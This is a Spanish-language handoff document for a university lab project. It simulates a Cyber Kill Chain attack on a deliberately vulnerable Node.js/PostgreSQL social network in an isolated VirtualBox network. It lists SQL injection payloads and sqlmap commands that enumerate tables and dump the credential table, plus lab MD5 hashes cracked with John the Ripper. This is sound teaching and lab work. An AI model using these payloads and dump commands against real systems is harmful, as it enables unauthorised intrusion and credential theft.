# 🛡️ DOCUMENTO DE TRASPASO — Proyecto Ciberseguridad SoyUCAB
## Handoff para Fase 4 (Explotación) en adelante — Cyber Kill Chain

> **Contexto general:** Proyecto académico UCAB (Ciberseguridad). Simulación de ataque sobre la app web vulnerable **SoyUCAB** (Red Social Universitaria) siguiendo la metodología **Cyber Kill Chain**. Entorno de laboratorio **aislado** en VirtualBox. Fines exclusivamente educativos.
>
> **Estado actual:** Fases 1 (Reconocimiento), 2 (Armamento) y 3 (Entrega) **COMPLETADAS**. Este documento entrega todo lo necesario para iniciar la **Fase 4 (Explotación)** y siguientes.

---

# 📦 PARTE 1 — ENTORNO Y VERSIONES

## 1.1 Arquitectura del laboratorio

| Máquina | SO | Rol | IP (Red Interna) |
|---|---|---|---|
| **Atacante** | Kali Linux 2024.x+ | Red Team | `192.168.56.10` (interfaz `eth1`) |
| **Víctima** | Ubuntu Server 22.04 LTS | Blue Team | `192.168.56.20` (interfaz `enp0s8`) |

- **Red:** VirtualBox **Red Interna** con nombre `redlab` (mismo nombre en ambas VMs), aislada.
- **Kali** usa doble adaptador: `eth0` (NAT/internet) + `eth1` (Red Interna).
- **Ubuntu** usa doble adaptador: `enp0s3` (NAT/internet) + `enp0s8` (Red Interna).

## 1.2 Software a instalar en UBUNTU (víctima)

La app corre sobre **Node.js + Express + Sequelize + PostgreSQL**.

### Node.js — versión 20 LTS
```bash
curl -fsSL https://deb.nodesource.com/setup_20.x -o nodesource_setup.sh
sudo -E bash nodesource_setup.sh
sudo apt install -y nodejs
node -v && npm -v   # Esperado: v20.x.x / npm 10.x.x
```

### PostgreSQL (última estable del repo Ubuntu 22.04)
```bash
sudo apt install -y postgresql postgresql-contrib
sudo systemctl enable --now postgresql
sudo systemctl status postgresql   # Debe decir "active (running)"
```

### Git
```bash
sudo apt install -y git
```

## 1.3 Despliegue de la aplicación (en UBUNTU)

**Repositorio:** `https://github.com/manuehhhhh/ProyectoCiber` (privado — requiere Personal Access Token de GitHub).

```bash
# 1. Clonar (usar token en el campo password)
git clone https://github.com/manuehhhhh/ProyectoCiber

# 2. Estructura REAL del proyecto (el backend NO está en la raíz)
cd ~/ProyectoCiber/mi-red-social-backend

# 3. Crear base de datos
sudo -u postgres psql -c "CREATE DATABASE red_social_db;"
sudo -u postgres psql -c "ALTER USER postgres WITH PASSWORD '123456';"

# 4. Cargar el esquema (el .sql está en src/, copiar a /tmp por permisos)
cp src/CREATE_FINAL.sql /tmp/
sudo -u postgres psql -d red_social_db -f /tmp/CREATE_FINAL.sql
sudo -u postgres psql -d red_social_db -c "\dt"   # Verificar 35 tablas

# 5. Instalar dependencias
npm install

# 6. Crear archivo .env (el proyecto usa dotenv, NO credenciales hardcodeadas)
nano .env
```

**Contenido del `.env`:**
```env
DB_NAME=red_social_db
DB_USER=postgres
DB_PASSWORD=123456
DB_HOST=localhost
DB_PORT=5432
```

```bash
# 7. Levantar el servidor (punto de entrada: src/index.js)
npm start
# Salida esperada:
#   Tablas sincronizadas con Sequelize
#   Servidor corriendo en el puerto 3000
```

> ⚠️ **La app escucha en `*:3000` (0.0.0.0)** → accesible desde Kali. Confirmado con `ss -tlnp | grep 3000`.

---

# ⚙️ PARTE 2 — PREPARACIÓN PARA INICIAR LA FASE 4

## 2.1 Checklist de reanudación del entorno

### En UBUNTU (víctima)
```bash
# 1. Verificar IP de Red Interna (Netplan es permanente, no debería fallar)
ip a | grep enp0s8   # Debe mostrar 192.168.56.20

# 2. Verificar PostgreSQL activo
sudo systemctl status postgresql

# 3. Levantar la app en segundo plano (para liberar la terminal)
cd ~/ProyectoCiber/mi-red-social-backend && npm start &

# 4. Confirmar que escucha
sudo ss -tlnp | grep 3000   # Debe mostrar *:3000 node
```

### En KALI (atacante)
```bash
# 1. Verificar IP de Red Interna (fijada de forma PERMANENTE con NetworkManager)
ip a | grep eth1   # Debe mostrar 192.168.56.10
# Si se perdió, la conexión permanente se llama "red-interna":
sudo nmcli connection up red-interna

# 2. Verificar conectividad con la víctima
ping -c 4 192.168.56.20

# 3. Confirmar que la app responde
curl http://192.168.56.20:3000   # Debe traer HTML de SoyUCAB
```

> 🔴 **IMPORTANTE:** La IP de Kali (`192.168.56.10`) se fijó permanente con:
> ```bash
> sudo nmcli connection add type ethernet ifname eth1 con-name red-interna ip4 192.168.56.10/24
> sudo nmcli connection modify red-interna ipv4.method manual ipv4.never-default yes
> sudo nmcli connection up red-interna
> ```
> Si al reiniciar se pierde, ejecutar `sudo nmcli connection up red-interna`.

## 2.2 Herramientas necesarias en KALI para Fase 4

Todas ya instaladas y verificadas (Kali 2024.x):

| Herramienta | Versión | Uso en Fase 4 |
|---|---|---|
| **SQLMap** | 1.10.2 | Explotación automatizada (sesión ya guardada) |
| **Wireshark** | 4.6.4 | 🆕 Captura de tráfico HTTP en claro (LO NUEVO de esta fase) |
| **curl** | 8.18 | Disparar peticiones para capturar |
| **Burp Suite** | Community 2026.x | Interceptación (ya usado en Fase 3) |
| **John the Ripper** | — | Cracking de hashes (ya usado) |

### Preparación específica de Wireshark
```bash
# Opción rápida: ejecutar con sudo
sudo wireshark

# Capturar en la interfaz eth1 (Red Interna) — NO en eth0 (NAT)
# Filtro de captura recomendado:
ip.addr == 192.168.56.20 && http
```

## 2.3 Datos que la BD ya tiene cargados (para pruebas)

La tabla `Miembro` fue **poblada** con 3 usuarios de prueba (hashes MD5 sin salt):

```sql
INSERT INTO Miembro (nombre_usuario, clave, tipo_miembro, fecha_registro)
VALUES 
  ('juan', md5('password123'), 'P', CURRENT_DATE),
  ('admin', md5('admin2025'), 'P', CURRENT_DATE),
  ('maria', md5('qwerty'), 'P', CURRENT_DATE);
```

---

# 📊 PARTE 3 — INFORMACIÓN RELEVANTE DE LAS FASES 1, 2 Y 3

## 3.1 Vulnerabilidades objetivo (del anteproyecto)

| ID | Vulnerabilidad | OWASP | CWE | Endpoint | Estado |
|---|---|---|---|---|---|
| 1 | **SQL Injection** | A05:2025 Injection | CWE-89 | `/api/search?q=` | ✅ Confirmada y explotada |
| 2 | **Hash Débil (MD5 sin salt)** | A04:2025 Crypto Failures | CWE-328 | tabla `Miembro.clave` | ✅ Confirmada y crackeada |

## 3.2 Hallazgos de la FASE 1 — Reconocimiento

### Puertos (nmap con sudo)
| Puerto | Estado | Servicio |
|---|---|---|
| **3000** | 🟢 open | HTTP — Node.js Express framework |
| 22 | closed | SSH (no activo) |
| 5432 | closed | PostgreSQL (solo escucha en localhost) |

### Huella tecnológica
- **Servidor:** Node.js + Express (header `X-Powered-By: Express`)
- **App:** SoyUCAB - Inicio
- **Frontend:** HTML5 + JavaScript Vanilla
- **Debilidades detectadas:** CORS abierto (`Access-Control-Allow-Origin: *`), `X-Powered-By` expuesto

### Directorios (gobuster): `/css/`, `/js/`, `/img/`, `/uploads/`, `/index.html`

### Inventario de endpoints de la API (17 rutas, extraídas de `js/main.js`)
```
/api/search              <- VECTOR PRINCIPAL SQLi (parametro q)
/api/post   /api/post/
/api/miembro             <- tabla de credenciales (hashes)
/api/comments  /api/comments/count/
/api/likes/  /api/likes/toggle
/api/persona/
/api/profile/
/api/publicar
/api/events
/api/relationship/follow  /api/relationship/status
/api/dependenciauniversitaria/
/api/organizacionasociada/
```

### Vectores adicionales identificados
- `/api/profile/${id}`, `/api/persona/${id}`, `/api/comments/${id}` → IDs en URL (posible SQLi)
- `/api/post/${id}?id_usuario_actual=...` (DELETE) → posible **Broken Access Control** (el `id_usuario_actual` viaja desde el cliente)

## 3.3 Hallazgos de la FASE 2 — Armamento

### SQL Injection confirmada en `/api/search?q=`
- **Motor:** PostgreSQL | **Esquema:** `public` | **Columnas en la query:** 4
- **Tipo (confirmado por SQLMap):** **Stacked Queries** (la variante más peligrosa — permite ejecutar comandos arbitrarios)
- **Payload validado por SQLMap:** `q=test';SELECT PG_SLEEP(5)--`
- **Comportamiento:** el backend devuelve error **genérico** (`{"error":"Error en el servidor"}`), no filtra el stack. UNION-based NO explotable (la app crashea al procesar filas → 500). SQLMap usó **time-based blind**.

### Payloads clave (arsenal)
```sql
test'                          -- Sondeo: rompe la query (HTTP 500)
test' -- -                     -- Repara la query (HTTP 200): control de sintaxis
test' OR '1'='1                -- Boolean verdadero
test' OR '1'='2                -- Boolean falso
test' ORDER BY 4 -- -          -- 200 (existe): la query tiene 4 columnas
test' ORDER BY 5 -- -          -- 500 (no existe)
test';SELECT PG_SLEEP(5)--     -- Stacked queries (vector confirmado)
```

### Esquema extraído (vía SQLMap time-based)
- **35 tablas** en el esquema `public` (asiste, carrera, comentario, comparte, crea, departamento, dependencia_universitaria, egresado, ensena_en, escuela, esta_en, estudia, estudiante, evento, facultad, grupo, **miembro**, persona, post, ...)
- **Tabla `miembro`:** 6 columnas — `id_miembro`, `nombre_usuario`, **`clave`** (varchar, contiene hashes MD5), `foto_perfil` (BYTEA), `tipo_miembro`, `fecha_registro`

### Credenciales extraídas y crackeadas (John the Ripper + rockyou)
| Usuario | Hash MD5 | Contraseña | Resultado |
|---|---|---|---|
| `juan` | `482c811da5d5b4bc6d497ffa98491e38` | `password123` | 💥 Crackeada instantánea |
| `maria` | `d8578edf8458ce06fbc5bb76a58c5ca4` | `qwerty` | 💥 Crackeada instantánea |
| `admin` | `e88df8596ff8847e232b1e4b1b5ffde2` | `admin2025` | 🛡️ Resistió rockyou + rules |

- **Velocidad de John:** ~27.000.000 hashes/seg (demuestra por qué MD5 sin salt es inseguro)

### Comandos SQLMap de referencia (sesión ya guardada en Kali)
```bash
# Detección
sqlmap -u "http://192.168.56.20:3000/api/search?q=test" -p q --batch

# Enumerar (OJO: en PostgreSQL usar -D public, NO red_social_db)
sqlmap -u "http://192.168.56.20:3000/api/search?q=test" -p q --batch --dbs
sqlmap -u "http://192.168.56.20:3000/api/search?q=test" -p q --batch -D public --tables
sqlmap -u "http://192.168.56.20:3000/api/search?q=test" -p q --batch -D public -T miembro --columns

# Dump de credenciales (limitar columnas acelera)
sqlmap -u "http://192.168.56.20:3000/api/search?q=test" -p q --batch -D public -T miembro -C nombre_usuario,clave --dump
```

## 3.4 Hallazgos de la FASE 3 — Entrega

- **Herramienta:** Burp Suite (proxy `127.0.0.1:8080` + Repeater)
- **Demostración:** entrega manipulada de payloads en tránsito. Contraste en el Repeater:

| Payload (en la URL) | Respuesta |
|---|---|
| `q=juan` | 200 OK `[]` |
| `q=test%27` | 500 Error (procesado sin sanitizar) |
| `q=test%27%20--%20-` | 200 OK (query reparada) |

- **Codificación URL obligatoria en el Repeater:** `%27` = `'`, `%20` = espacio.
- **Hallazgo del frontend:** el cliente web se queda en "Cargando..." sin sesión activa (su JS falla), pero **el endpoint `/api/search` es explotable directamente vía Burp/curl sin depender del frontend**.
- **Descartado:** `eventos.html?filtro=` es archivo estático → no procesa el param contra SQL → no es vector.

---

# 🚀 PARTE 4 — QUÉ DEBE HACERSE EN LA FASE 4 (EXPLOTACIÓN)

Según el anteproyecto, la Fase 4 consiste en:

1. **Ejecución exitosa de la SQL Injection**
   - Bypass y/o extracción de la tabla `miembro` (ya demostrado con SQLMap — consolidar).
   - Dump completo con los hashes MD5.

2. **🆕 Captura de tráfico HTTP en claro con Wireshark (LO NUEVO)**
   - La app va por **HTTP sin TLS** → credenciales y datos viajan en **texto plano**.
   - Capturar en interfaz **`eth1`** (Red Interna) con filtro `ip.addr == 192.168.56.20 && http`.
   - Generar tráfico (login/búsqueda/peticiones) y demostrar que se leen datos sensibles en tránsito.
   - **Evidencia clave:** captura de Wireshark mostrando una petición HTTP con datos/credenciales legibles.

3. **Consolidar evidencias** del ataque exitoso (capturas de terminal, respuestas del servidor, datos extraídos).

> **Nota:** Parte de la explotación (extracción + cracking) ya se adelantó en la Fase 2 con SQLMap. En la Fase 4 se documenta formalmente y se añade el componente de **Wireshark**.

---

# 📸 RECORDATORIO SOBRE EVIDENCIAS

Para cada acción de la Fase 4 en adelante, **tomar capturas de pantalla** en los momentos clave: ejecución de comandos con resultado exitoso, confirmación de hitos, y pruebas directas (dumps, tráfico capturado). Guardar en carpeta organizada por fase (`~/proyecto-ciber/04-explotacion/`).

---

# ⚖️ NOTA ÉTICA
Todo el trabajo se ejecuta **exclusivamente** dentro del entorno virtualizado aislado (Red Interna), con fines académicos. Prohibido usar estas técnicas fuera del laboratorio.
